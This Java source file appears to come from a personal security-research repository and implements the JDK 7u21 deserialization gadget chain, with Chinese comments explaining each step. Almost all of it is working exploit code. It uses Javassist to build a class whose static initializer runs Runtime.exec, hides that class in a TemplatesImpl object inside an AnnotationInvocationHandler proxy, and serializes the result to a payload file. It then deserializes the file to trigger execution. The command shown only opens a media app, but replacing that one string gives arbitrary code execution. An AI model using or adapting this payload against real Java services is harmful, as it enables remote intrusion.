package com.sec.exploits.jdk7u21;

import com.sec.annotation.Dependencies;
import com.sec.exploits.CommonsCollections.CommonsCollections6.HashMap_Exploit;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.LinkedHashSet;
import java.util.Map;

/**
 * @program: Gadgets
 * @description:
 * @author: 0range
 * @create: 2021-05-21 11:41
 **/

/**
 * Gadget chain :
 * LinkedHashSet.readObject()
 *   LinkedHashSet.addEntry()
 *     ...
 *       TemplatesImpl.hashCode() (X)
 *   LinkedHashSet.add()
 *     ...
 *       Proxy(Templates).hashCode() (X)
 *         AnnotationInvocationHandler.invoke() (X)
 *           AnnotationInvocationHandler.hashCodeImpl() (X)
 *             String.hashCode() (0)
 *             AnnotationInvocationHandler.memberValueHashCode() (X)
 *               TemplatesImpl.hashCode() (X)
 *       Proxy(Templates).equals()
 *         AnnotationInvocationHandler.invoke()
 *           AnnotationInvocationHandler.equalsImpl()
 *             Method.invoke()
 *               ...
 *                  // TemplatesImpl.getOutputProperties()也可以
 *                   TemplatesImpl.newTransformer()
 *                     TemplatesImpl.getTransletInstance()
 *                       TemplatesImpl.defineTransletClasses()
 *                         ClassLoader.defineClass()
 *                         Class.newInstance()
 *                           ...
 *                             MaliciousClass.<clinit>()
 *                               ...
 *                                 Runtime.exec()
 */

@Dependencies({
        "jdk <= 7u21"
})
public class Exploit {
    public static void main(String[] args) throws Exception{
        //1.先创建恶意类
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass tempExploitClass = pool.makeClass("3xpl01t");
        //一定要设置父类，为了后续顺利
        tempExploitClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        //写入payload，生成字节数组
        String cmd = "java.lang.Runtime.getRuntime().exec(\"open /Applications/IINA.app\");";
        tempExploitClass.makeClassInitializer().insertBefore(cmd);
        byte[] exploitBytes = tempExploitClass.toBytecode();

        //2.new一个TemplatesImpl对象，修改tmpl类属性，为了满足后续利用条件
        TemplatesImpl tmpl = new TemplatesImpl();
        //设置_bytecodes属性为exploitBytes
        Field bytecodes = TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(tmpl, new byte[][]{exploitBytes});
        //一定要设置_name不为空
        Field _name = TemplatesImpl.class.getDeclaredField("_name");
        _name.setAccessible(true);
        _name.set(tmpl, "0range");
        //_class为空
        Field _class = TemplatesImpl.class.getDeclaredField("_class");
        _class.setAccessible(true);
        _class.set(tmpl, null);

        //整个map,容量为2
        Map map = new HashMap(2);
        String magicStr = "f5a5a608";
        // 放入实际的 value
        map.put(magicStr, tmpl);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor cons = clazz.getDeclaredConstructor(Class.class,Map.class);
        cons.setAccessible(true);
        InvocationHandler invocationHandler = (InvocationHandler) cons.newInstance(Templates.class, map);

        Templates proxy = (Templates) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(), new Class[]{Templates.class}, invocationHandler);

        HashSet target = new LinkedHashSet();
        target.add(tmpl);
        target.add(proxy);

        //payload序列化写入文件，模拟网络传输
        ObjectOutputStream fout = new ObjectOutputStream(new FileOutputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_jdk7u21.ser")));
        fout.writeObject(target);

        //服务端读取文件，反序列化，模拟网络传输
        ObjectInputStream fin = new ObjectInputStream(new FileInputStream(new File(System.getProperty("user.dir")+"/src/main/resources/Payload_jdk7u21.ser")));
        //服务端反序列化，触发漏洞
        fin.readObject();

    }
}
